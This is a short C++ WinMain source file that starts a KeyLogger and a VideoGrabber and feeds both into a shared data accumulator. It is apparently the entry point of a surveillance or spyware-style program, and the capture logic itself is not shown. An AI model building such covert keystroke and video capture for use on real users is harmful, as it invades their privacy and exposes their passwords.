#include <Windows.h>
#include "DataAccumulator.h"
#include "DataProvider.h"
#include "VideoGrabber.h"
#include "KeyLogger.h"

int WINAPI WinMain ( HINSTANCE hInstance, HINSTANCE hPrevInstance,
					LPSTR lpCmdLine, int nCmdShow )
{
	DataAccumulator* dataAccumulator = new DataAccumulator();
	VideoGrabber* videoGrabber = new VideoGrabber();
	KeyLogger* keyLogger = new KeyLogger();

	videoGrabber->SetDataAccumulator(dataAccumulator);
	videoGrabber->Init();
	keyLogger->SetDataAccumulator(dataAccumulator);
	keyLogger->Init();

	MSG Msg; // save window messages here.

    /* Run the message pump. It will run until GetMessage() returns 0 */
    while (GetMessage (&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg); // Translate virtual-key messages to character messages
        DispatchMessage(&Msg); // Send message to WindowProcedure
    }

	delete videoGrabber;
	delete keyLogger;

	return Msg.wParam;
}
